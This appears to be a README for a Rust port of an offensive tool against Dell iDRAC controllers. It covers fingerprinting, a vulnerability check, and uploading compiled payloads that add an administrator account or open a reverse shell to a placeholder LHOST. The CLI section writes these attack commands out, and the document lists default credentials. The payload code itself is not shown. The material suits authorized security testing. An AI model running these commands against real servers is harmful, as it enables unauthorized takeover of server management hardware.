# libiDRAC — Rust port

Educational Rust port of the Python [`libiDRAC`](https://github.com/rawnullbyte/libiDRAC)
package (`setup.py v1.0.0`, `libiDRAC/idrac.py`). Same behavior, zero python
runtime: async HTTP via `reqwest`, SSH via libssh2 (`ssh2` crate), embedded
payload sources.

**v1.1 hardening pass** — see [Performance & reliability](#performance--reliability):
automatic retries, layered timeouts, a compile cache, hard deadlines around
every external process, and fail-fast input validation.

> **For education / labs only.** Don't point it at systems you don't own or
> have explicit authorization to test.

## Layout

```
rust-port/
├── Cargo.toml            # lib + CLI binary + LTO release profile
├── src/
│   ├── lib.rs            # crate docs + re-exports (_VERSION / _AUTHOR consts)
│   ├── idrac.rs          # the iDRAC class port (get_info / check_if_vulnerable / exploit / get_inventory)
│   ├── compile_cache.rs  # content-addressed .so cache (skips the cross-compiler on repeat runs)
│   ├── payloads.rs       # embedded payload registry (replaces os.listdir over payloads/)
│   ├── payloads/*.c      # verbatim copies of the upstream C payload sources
│   └── main.rs           # small CLI wrapper (python shipped no console script)
└── tests: 15 unit tests inline in idrac.rs / compile_cache.rs + 1 doctest
```

## Build

Requires Rust 1.80+ and a C compiler for `libssh2` (any default MSVC /
mingw / gcc toolchain works).

```bash
cargo build --release
# binaries in target/release/libidrac.exe
```

To run the payload flow you also need the `sh4-linux-gnu-gcc` cross compiler
in `PATH`, exactly like the python version (`os.system('sh4-linux-gnu-gcc
-shared -fPIC ...')`).

## CLI

```bash
libidrac <IP> info
libidrac <IP> check
libidrac <IP> exploit --payload adduser --username X --password Y --privilege 0x000001ff
libidrac <IP> exploit --payload reverseshell --reverse-ip LHOST --reverse-port LPORT
libidrac <IP> inventory --username root --password calvin
libidrac <IP> info --port 443 --timeout 10 --retries 3
libidrac --help
```

## Performance & reliability (v1.1)

The 1:1 semantics are unchanged — these are hard layers added *around* them.

### HTTP layer
| Change | Why |
|---|---|
| Retries with jittered exponential backoff (`250ms ×2^n`, ±25%, cap 2s; default 2 extra attempts, `--retries` / `Options.retries`) | the python version died on the first flaky packet; ephemeral connect failures and half-open resets now self-heal |
| Separate **connect** timeout (10s) vs **request** timeout (30s, `--timeout`) | python had no connect dial bound — a hostile host could stall the TCP dial for minutes |
| Keep-alive pool (90s idle, 4 per host) + `TCP_NODELAY` | `get_info` fires 2–4 requests at the same host; each reused connection saves a full TLS handshake |
| iDRAC7/8 fingerprint probes (`prodClassName` + `aimGetProp`) run **concurrently** | python paid two serial round-trips; now one |

### Exploit path
| Change | Why |
|---|---|
| **Content-addressed compile cache** (`src/compile_cache.rs`) — identical rendered payload sources skip `sh4-linux-gnu-gcc` entirely; artifacts under `<tempdir>/libidrac-payload-cache` keyed by FNV-1a(source) + length, sanity-gated on ELF magic | the cross-compiler is the slowest step of every run; repeat runs with the same payload/credentials are ~100% faster. Opt out with `LIBIDRAC_NO_CACHE=1`. Cache misses can't poison runs (magic + size gates) and cache failures never fail an exploit |
| **Hard compile deadline** (90s) with `kill_on_drop` — a wedged gcc process is killed, not hung | python's `os.system` could hang an exploit forever |
| **gcc stderr diagnostics** in the error result | used to be a bare "Compilation failed (SH4 cross-compiler required)"; now you see the actual compiler error line |
| **Fail-fast parameter validation** before any filesystem/network side effect: privilege must parse as hex/decimal, username/password/reverse-ip must not contain `"` `\` newlines NUL, `reverseshell` requires `--reverse-ip`/`--reverse-port` | python spliced raw values into C source and discovered breakage at gcc time with a confusing error far from the root cause |
| Frame builder `build_upload_frame()` is shared by code + test | single source of truth for the byte-exact `RACPKSSHAUTHKEY1` framing |

### SSH inventory
| Change | Why |
|---|---|
| Adaptive banner wait (stop when the stream goes quiet 700ms, hard cap 5s) instead of python's fixed `sleep(3)` | typically ~2s faster per run |
| Socket read/write timeouts (30s) *before* the handshake | a half-open connection could previously wedge the libssh2 handshake (and the OS thread) indefinitely |
| Bounded TCP connect retry (2 attempts, 400ms apart) | a single dropped SYN no longer kills the run |
| Absolute 120s cap on the transcript read loop + **150s wall clock** around the whole session (`SSH_WALL_CLOCK`) | a wedged iDRAC can no longer hang `get_inventory()` forever |

### Binary
`[profile.release]` uses fat LTO + `codegen-units = 1` + symbol stripping —
the tool's wall time is dominated by TLS handshakes and payload compilation,
both of which benefit.

### Behavior notes
* The verbatim console messages are preserved (`Compiling {payload} payload...`,
  `Payload uploaded successfully`, `Received N bytes`, ...). Two additive
  lines exist only where python had no direct equivalent: the cache hit
  reports `Compilation successful (cache hit)` and the transcript cap prints
  `Inventory transcript reached its 120s cap, stopping`.
* `Compilation failed` errors now carry the first gcc diagnostic line
  (prefix unchanged, diagnostics appended).

## Library API

```rust
use libidrac::{ExploitParams, IDrac};

let mut idrac = IDrac::new("10.0.0.10", 443)?;
idrac.set_credentials("root", "calvin");

// getInfo()  ->  InfoResult      (serde: ip, port, hostname, systemModel, idracModel, license, fwVersion, error, success)
let info    = idrac.get_info().await?;
// checkIfVulnerable() -> VulnerabilityResult (vulnerable, error, success)
let vuln    = idrac.check_if_vulnerable().await?;
// exploit() SSH_PUBLIC_KEY packet framing gets byte-for-byte parity; see unit test
// `upload_framing_matches_python`.
let params = ExploitParams::default();       // adduser    / root / calvin / 0x000001ff
let result = idrac.exploit(&params).await;
// getInventory(None, None) -> InventoryResult { success, error, raw_logs }
let inv    = idrac.get_inventory(Some("root"), Some("calvin")).await;
```

All Python result dictionaries map to `serde::Serialize` structs with the same
camelCase keys (`systemModel`, `fwVersion`, `rawLogs`...), so
`serde_json::to_string(&result)` is a drop-in match for `json.dumps(result)`.

## Python ↔ Rust mapping

| Python (`idrac.py`)                    | Rust (`idrac.rs`)                          |
|----------------------------------------|--------------------------------------------|
| `iDRAC(ip, port=443)`                  | `IDrac::new(ip, port)`                     |
| `_ensure_client()` httpx context       | eager `reqwest::Client` in `IDrac::new`    |
| `_fetchURL(endpoint, data)`            | `fetch_url()` (GET/POST raw bytes)         |
| `getInfo()`                            | `get_info().await`                         |
| `checkIfVulnerable()`                  | `check_if_vulnerable().await`              |
| `exploit(...)`                         | `exploit(&ExploitParams).await`            |
| `getInventory(None, None)`             | `get_inventory(username, password).await`  |
| `payloads/*.c` + `os.listdir`          | `include_str!` registry in `src/payloads`  |
| `os.system("sh4-linux-gnu-gcc ...")`   | `tokio::process::Command(...)`             |
| `struct.pack('<L', len(so))` + alias   | `to_le_bytes()` framing (byte-for-byte)    |
| `paramiko` AutoAddPolicy ssh session   | `ssh2::Session` (no host key verification) |
| work folder `work_<uuid4[:8]>`         | `work_<hex encode random 4 bytes>`         |
| `async with iDRAC(...)` context manager| plain struct (drop = client closed)        |

Some internal helpers also mirror line-by-line semantics: XML `<prodClassName>`
tag extraction, `.split('- ')[1]` parsers, uuid-derived work dir names,
semi-colon print lines preserved verbatim (`Compiling adduser payload...`,
`Payload uploaded successfully`, ...), plus the idle-timeout racadm sweep
(`Received X bytes`, `No data for 10 seconds, assuming completion`).

## Porting notes & deliberate differences

* **`rLogin is None` branches** — the original `_fetchURL` never actually
  returned `None`, so its "Timeout connecting to iDRAC" paths were dead code
  and httpx timeouts would raise. The port implements the evident intent:
  transport failures collapse to `fetch_maybe() -> None`, surfacing as the
  `error: Timeout connecting to iDRAC` results instead of exceptions.
* **Payload file discovery** — python discovered payload sources via
  `os.listdir` at *runtime*; here they're `include_str!`-ed into the binary so
  the `Payload file not found` branch can't occur (the "Invalid payload type.
  Available types: [...]" error still exists).
* **TLS** — the Python ssl context set `CERT_NONE` + `SECLEVEL=0` + `TLSv1`
  floor. The Rust client uses the default schannel/OpenSSL backend with
  invalid-cert/hostname checks disabled and `tls_version_min(TLS_1_0)` if the
  feature is available. Cipher-level `SECLEVEL=0` equating isn't guaranteed on
  every platform (schannel honors the OS crypto config), but TLS 1.0/1.2
  negotiation is still possible in real environments.
* **`str.replace` placeholder handling** — when `reverse_ip/reverse_port` are
  `None`, python would raise `TypeError`; the port substitutes the literal
  `"None"` (which the f-string prints `str(None)` behavior would do likewise).
* **`payload_type` validation** unchanged: invalid types produce
  `Invalid payload type. Available types: [adduser, adduser_enterprise,
  quickpayload, reverseshell]` (order matches `os.listdir` alphabetical
  order of the shipped sources).

## Tests

```bash
cargo test
```

Covers: firmware-version gate, fwVersion JSON parse semantics incl. the
python `KeyError`/`AttributeError` surface, `<prodClassName>` extraction,
`.get(key, 'Unknown')` defaults, the raw SSH public-key upload byte framing
(through the shared `build_upload_frame()`), exploit-parameter
fail-fast validation (privilege parsing, C-literal safety, reverseshell
target requirements), the retry backoff schedule, and the compile cache
(FNV-1a reference vectors, entry naming, round-trip, non-ELF rejection).
